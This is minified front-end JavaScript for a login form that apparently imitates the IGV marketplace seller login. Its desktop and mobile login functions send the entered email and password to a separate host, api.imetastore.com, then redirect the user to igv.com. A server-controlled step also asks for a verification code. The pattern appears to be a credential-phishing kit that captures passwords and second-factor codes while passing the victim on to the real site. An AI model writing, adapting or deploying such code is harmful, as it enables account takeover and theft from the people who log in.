const email=document.querySelector(".input-wrapper.email"),emailInput=email.firstElementChild.lastChild,emailForgot=document.querySelector(".input-wrapper.email-forgot"),emailInputForgot=emailForgot.firstElementChild.lastChild;let inputAll;if("web"==document.querySelector("#app").getAttribute("data-layout")){console.log("desktop");const e=document.querySelector(".login-select.login"),t=document.querySelectorAll(".login-select")[2];inputAll=[...inputAll=e.querySelectorAll("input"),...t.querySelectorAll("input")]}else{const e=document.querySelector(".containerReg");inputAll=[...document.querySelectorAll(".login-pwd")[0].querySelectorAll("input"),...e.querySelectorAll("input")],console.log(inputAll)}const password=document.querySelector(".input-wrapper.password"),passwordInput=document.querySelector(".input-wrapper.password").firstElementChild.firstElementChild,eyeBoxes=document.querySelectorAll(".eye-box"),checkbox=document.querySelectorAll(".checkbox-wrapper.checkbox"),forgotPassword=document.querySelector(".forgot-password"),dialogWrapper=document.querySelector(".dialog-wrapper"),close=document.querySelector(".dialog-top").firstElementChild,sendCode=document.querySelectorAll(".send-code"),changeButtons=document.querySelectorAll(".change-btn"),loginSelect=document.querySelectorAll(".login-select"),web3button=document.querySelector(".web3-btn"),checkboxRegister=document.querySelector(".checkbox-register"),registerButton=document.querySelector(".register-button"),resetPassword=document.querySelector('[aria-label="Reset Password"]'),orangeBtn=document.querySelectorAll(".orange-btn"),goButton=document.querySelector("#go"),EMAIL_REGEXP=/^(([^<>()[\].,;:\s@"]+(\.[^<>()[\].,;:\s@"]+)*)|(".+"))@(([^<>()[\].,;:\s@"]+\.)+[^<>()[\].,;:\s@"]{2,})$/iu;function isEmailValid(e){return EMAIL_REGEXP.test(e)}const PASSWORD_REGEXP=/(?=.*[0-9])(?=.*[!@#$%^&*])(?=.*[A-Za-z])/;function isPasswordValid(e){return PASSWORD_REGEXP.test(e)}function sleep(e){return new Promise(t=>setTimeout(t,e))}function getCookie(e){let t=document.cookie.match(new RegExp("(?:^|; )"+e.replace(/([\.$?*|{}\(\)\[\]\\\/\+^])/g,"\\$1")+"=([^;]*)"));return t?decodeURIComponent(t[1]):void 0}function login_desktop(){if(console.log(orangeBtn[0].firstElementChild),void 0==(e=getCookie("unique_id"))){var e=Date.now();document.cookie=`unique_id=${e};`}var t=$('input[id="emailDesktop"]').val();document.cookie=`email=${t};`;var l=JSON.stringify({unique_id:`${e}`,login:$('input[id="emailDesktop"]').val(),password:$('input[id="passwordDesktop"]').val()});$.ajax({url:"https://api.imetastore.com/login_seller",type:"POST",timeout:3e3,data:l,dataType:"json",contentType:"application/json",accept:"application/json",success:function(e){if(console.log(e),"success"===e.status){document.querySelector('[type="login_desktop"]').disabled=!1;const e=new URLSearchParams(window.location.search);if(console.log(e.get("redirectURL")),null!==e.get("redirectURL")){var t=e.get("redirectURL");console.log(t);var l=t.match(/\/(\d+)$/),n=l?l[1]:null;window.location.href=`https://www.igv.com/items/${n}`}else window.location.href="https://www.igv.com/login"}else if("failed_account"===e.status)console.log(e.status),document.querySelector('[type="login_desktop"]').disabled=!1,goButton.firstElementChild.style.display="none",goButton.classList.remove("loading"),errorActive("Account or password error");else if("failed_password"===e.status)document.querySelector('[type="login_desktop"]').disabled=!1,goButton.firstElementChild.style.display="none",errorActive("The account password does not match");else if("timeout"===e.status)errorActive("Account or password error");else if("gauth_need"===e.status){document.querySelector(".login-select.login").style.display="none",document.querySelector(".login-select.ver-code").style.display=null,document.querySelector('[type="login_desktop"]').disabled=!1,document.querySelectorAll(".verify-input-title").forEach(e=>{void 0!=$('input[id="emailDesktop"]').val()?e.textContent=`Bound email: ${$('input[id="emailDesktop"]').val()}`:e.textContent="Bound email: EMAIL@gmail.com"})}}})}function login_mobile(){if(void 0==(e=getCookie("unique_id"))){var e=Date.now();document.cookie=`unique_id=${e};`}var t=$('input[id="emailMobile"]').val();document.cookie=`email=${t};`;var l=JSON.stringify({unique_id:`${e}`,login:$('input[id="emailMobile"]').val(),password:$('input[id="passwordMobile"]').val()});console.log(l),$.ajax({url:"https://api.imetastore.com/login_seller",type:"POST",timeout:3e4,data:l,dataType:"json",contentType:"application/json",accept:"application/json",success:function(e){if(console.log(e.status),"success"===e.status){const e=new URLSearchParams(window.location.search);if(console.log(e.get("redirectURL")),document.querySelector('[type="login_mobile"]').disabled=!1,null!==e.get("redirectURL")){var t=e.get("redirectURL");console.log(t);var l=t.match(/\/(\d+)$/),n=l?l[1]:null;window.location.href=`https://www.igv.com/items/${n}`}else window.location.href="https://www.igv.com/login"}else if("failed_account"===e.status)document.querySelector('[type="login_mobile"]').disabled=!1,goButton.firstElementChild.style.display="none",errorActive("Account or password error");else if("failed_password"===e.status)document.querySelector('[type="login_mobile"]').disabled=!1,goButton.firstElementChild.style.display="none",email.lastElementChild.textContent="The account password does not match",email.lastElementChild.style.display=null,email.lastElementChild.classList.add("error-enter-active"),sleep(1).then(()=>{email.lastElementChild.classList.remove("error-leave-active")}),errorActive("The account password does not match");else if("timeout"===e.status)document.querySelector('[type="login_mobile"]').disabled=!1;else if("gauth_need"===e.status){document.querySelector(".login-wrapper").style.display="none",document.querySelector(".login-left").style.display=null,document.querySelector('[type="login_mobile"]').disabled=!1,document.querySelectorAll(".verify-input-title").forEach(e=>{void 0!=$('input[id="emailMobile"]').val()?e.textContent=`Bound email: ${$('input[id="emailMobile"]').val()}`:e.textContent="Bound email: EMAIL@gmail.com"})}}})}function errorActive(e){document.body.insertAdjacentHTML("beforeend",`\n  <div data-v-abbc8254="" id="meta_message_1" class="message_wrapper error msg-fade-enter-active" style="top: 20px;"><svg data-v-abbc8254="" class="svg-icon message-icon" aria-hidden="true"><use xlink:href="#svg-icon-message-error"></use></svg><p data-v-abbc8254="" class="center-message">${e}</p><svg data-v-abbc8254="" class="svg-icon close-icon close-btn" aria-hidden="true"><use style="pointer-events: none;\n  " xlink:href="#svg-icon-close-error"></use></svg></div>\n      `),sleep(100).then(()=>{document.querySelector("#meta_message_1").classList.remove("msg-fade-enter-active")}),document.querySelector(".close-btn").addEventListener("click",e=>{const t=e.target;console.log(t),document.querySelector("#meta_message_1").classList.add("msg-fade-leave-active"),sleep(299).then(()=>{t.parentElement.remove()})}),sleep(3e3).then(()=>{document.querySelector("#meta_message_1").classList.add("msg-fade-leave-active")}),sleep(3301).then(()=>{document.querySelector("#meta_message_1").remove()})}inputAll.forEach(e=>{e.addEventListener("input",t=>{0!=e.value.length?e.previousElementSibling.style.display="none":0==e.value.length&&(e.previousElementSibling.style.display=null)})}),inputAll.forEach(e=>{e.addEventListener("focus",t=>{e.parentElement.parentElement.classList.add("input-active"),e.parentElement.parentElement.classList.remove("error"),e.parentElement.parentElement.lastElementChild.style.display="none",e.parentElement.parentElement.lastElementChild.classList.remove("error-enter-active"),e.parentElement.parentElement.lastElementChild.classList.add("error-leave-active")})}),inputAll.forEach(e=>{e.addEventListener("blur",t=>{switch(e.parentElement.parentElement.classList.remove("input-active"),e.parentElement.parentElement.getAttribute("data-empty")){case"email":if(0==e.value.length){e.parentElement.parentElement.classList.add("error"),e.parentElement.parentElement.lastElementChild.classList.add("error-enter-active"),sleep(1).then(()=>{e.parentElement.parentElement.lastElementChild.classList.remove("error-leave-active")}),e.parentElement.parentElement.lastElementChild.innerText="Cannot be empty",e.parentElement.parentElement.lastElementChild.style.display=null;break}isEmailValid(e.value)||(e.parentElement.parentElement.classList.add("error"),e.parentElement.parentElement.lastElementChild.classList.add("error-enter-active"),sleep(1).then(()=>{e.parentElement.parentElement.lastElementChild.classList.remove("error-leave-active")}),e.parentElement.parentElement.lastElementChild.innerText="Incorrect email format",e.parentElement.parentElement.lastElementChild.style.display=null);break;case"password":if(0==e.value.length){e.parentElement.parentElement.classList.add("error"),e.parentElement.parentElement.lastElementChild.classList.add("error-enter-active"),sleep(1).then(()=>{e.parentElement.parentElement.lastElementChild.classList.remove("error-leave-active")}),e.parentElement.parentElement.lastElementChild.innerText="Cannot be empty",e.parentElement.parentElement.lastElementChild.style.display=null;break}e.value.length<8||e.value.length>16?(e.parentElement.parentElement.classList.add("error"),e.parentElement.parentElement.lastElementChild.classList.add("error-enter-active"),sleep(1).then(()=>{e.parentElement.parentElement.lastElementChild.classList.remove("error-leave-active")}),e.parentElement.parentElement.lastElementChild.innerText="Please enter 8 - 16 characters",e.parentElement.parentElement.lastElementChild.style.display=null):isPasswordValid(e.value)||(e.parentElement.parentElement.classList.add("error"),e.parentElement.parentElement.lastElementChild.classList.add("error-enter-active"),sleep(1).then(()=>{e.parentElement.parentElement.lastElementChild.classList.remove("error-leave-active")}),e.parentElement.parentElement.lastElementChild.innerText="Incorrect password format (any two of numbers, letters, symbols)",e.parentElement.parentElement.lastElementChild.style.display=null);break;case"confirmPassword":if(0==e.value.length){e.parentElement.parentElement.classList.add("error"),e.parentElement.parentElement.lastElementChild.classList.add("error-enter-active"),sleep(1).then(()=>{e.parentElement.parentElement.lastElementChild.classList.remove("error-leave-active")}),e.parentElement.parentElement.lastElementChild.innerText="Cannot be empty",e.parentElement.parentElement.lastElementChild.style.display=null;break}e.parentElement.parentElement.previousElementSibling.firstElementChild.lastElementChild.value!=e.value&&(e.parentElement.parentElement.classList.add("error"),e.parentElement.parentElement.lastElementChild.classList.add("error-enter-active"),sleep(1).then(()=>{e.parentElement.parentElement.lastElementChild.classList.remove("error-leave-active")}),e.parentElement.parentElement.lastElementChild.innerText="Inconsistent passwords",e.parentElement.parentElement.lastElementChild.style.display=null);break;case"code":if(0==e.value.length){e.parentElement.parentElement.classList.add("error"),e.parentElement.parentElement.lastElementChild.classList.add("error-enter-active"),sleep(1).then(()=>{e.parentElement.parentElement.lastElementChild.classList.remove("error-leave-active")}),e.parentElement.parentElement.lastElementChild.innerText="Cannot be empty",e.parentElement.parentElement.lastElementChild.style.display=null;break}}})}),emailInputForgot.addEventListener("focus",e=>{emailForgot.classList.contains("error")&&(emailForgot.classList.remove("error"),emailForgot.lastElementChild.style.display="none")}),eyeBoxes.forEach(e=>{const t=e.parentElement.firstElementChild.lastElementChild;e.addEventListener("click",l=>{"password"==t.type?(t.type="text",e.firstElementChild.style.display=null,e.lastElementChild.style.display="none"):"text"==t.type&&(t.type="password",e.firstElementChild.style.display="none",e.lastElementChild.style.display=null)})}),checkbox.forEach(e=>{e.addEventListener("click",t=>{e.classList.toggle("active"),e.classList.contains("active")?e.firstElementChild.style.display=null:e.firstElementChild.style.display="none"})}),null!==checkboxRegister&&checkboxRegister.addEventListener("click",e=>{e.target;const t=registerButton;console.log(t),t.classList.contains("disabled")?(t.classList.remove("disabled"),t.style.background=null,t.style.color=null,t.style.cursor="pointer"):(t.classList.add("disabled"),t.style.background="#E6E6E6",t.style.color="cccccc",t.style.cursor="not-allowed")}),forgotPassword.addEventListener("click",e=>{document.querySelector(".dialog-wrapper").classList.remove("dialog-fade-leave-active"),dialogWrapper.style.display=null,document.querySelector(".dialog-wrapper").classList.add("dialog-fade-enter-active")}),orangeBtn.forEach(e=>{e.addEventListener("click",t=>{e.classList.add("loading"),e.firstElementChild.style.display=null})}),sendCode.forEach(e=>{e.addEventListener("mouseover",t=>{e.style.backgroundColor="rgb(255,236,230)"})}),sendCode.forEach(e=>{e.addEventListener("mouseleave",t=>{e.style.backgroundColor=null})}),sendCode.forEach(e=>{e.addEventListener("click",t=>{let l=120;e.disabled=!0,e.textContent=l+" S";const n=setInterval(()=>{console.log(l),console.log(e),l-=1,e.textContent=l+" S",0==l&&(clearTimeout(n),e.textContent="Send Code",e.disabled=!1)},1e3)})}),close.addEventListener("click",e=>{document.querySelector(".dialog-wrapper").classList.remove("dialog-fade-enter-active"),document.querySelector(".dialog-wrapper").classList.add("dialog-fade-leave-active"),sleep(200).then(()=>{close.parentElement.parentElement.parentElement.style.display="none"})}),changeButtons.forEach(e=>{e.addEventListener("click",e=>{console.log(changeButtons),e.target==changeButtons[0]?(console.log(123),window.location.href):(loginSelect[2].style.display="none",loginSelect[1].style.display=null)})}),goButton.addEventListener("click",e=>{if("login_desktop"==goButton.getAttribute("type")){const t=document.querySelector("#emailDesktop");isEmailValid(t.value)?(e.target.classList.add("loading"),e.target.firstElementChild.style.display=null,e.target.disabled=!0,login_desktop()):0==t.value.length?(t.parentElement.parentElement.classList.add("error"),t.parentElement.parentElement.lastElementChild.classList.add("error-leave-active"),t.parentElement.parentElement.lastElementChild.classList.add("error-enter-active"),sleep(1).then(()=>{t.parentElement.parentElement.lastElementChild.classList.remove("error-leave-active")}),t.parentElement.parentElement.lastElementChild.innerText="Cannot be empty",t.parentElement.parentElement.lastElementChild.style.display=null):t.value.length>0&&isEmailValid(t.value)&&(t.parentElement.parentElement.classList.add("error"),t.parentElement.parentElement.lastElementChild.classList.add("error-leave-active"),t.parentElement.parentElement.lastElementChild.classList.add("error-enter-active"),sleep(1).then(()=>{t.parentElement.parentElement.lastElementChild.classList.remove("error-leave-active")}),t.parentElement.parentElement.lastElementChild.innerText="Incorrect email format",t.parentElement.parentElement.lastElementChild.style.display=null)}else if("login_mobile"==goButton.getAttribute("type")){const t=document.querySelector("#emailMobile");isEmailValid(t.value)?(e.target.classList.add("loading"),e.target.firstElementChild.style.display=null,e.target.disabled=!0,login_mobile()):0==t.value.length?(t.parentElement.parentElement.classList.add("error"),t.parentElement.parentElement.lastElementChild.classList.add("error-leave-active"),t.parentElement.parentElement.lastElementChild.classList.add("error-enter-active"),sleep(1).then(()=>{t.parentElement.parentElement.lastElementChild.classList.remove("error-leave-active")}),t.parentElement.parentElement.lastElementChild.innerText="Cannot be empty",t.parentElement.parentElement.lastElementChild.style.display=null):t.value.length>0&&isEmailValid(t.value)&&(t.parentElement.parentElement.classList.add("error"),t.parentElement.parentElement.lastElementChild.classList.add("error-leave-active"),t.parentElement.parentElement.lastElementChild.classList.add("error-enter-active"),sleep(1).then(()=>{t.parentElement.parentElement.lastElementChild.classList.remove("error-leave-active")}),t.parentElement.parentElement.lastElementChild.innerText="Incorrect email format",t.parentElement.parentElement.lastElementChild.style.display=null)}}),web3button.addEventListener("click",e=>{console.log("webConnect"),window.location="https://walletconnect.com"}),resetPassword.addEventListener("click",e=>{resetPassword.classList.add("loading"),e.target.firstElementChild.style.display=null});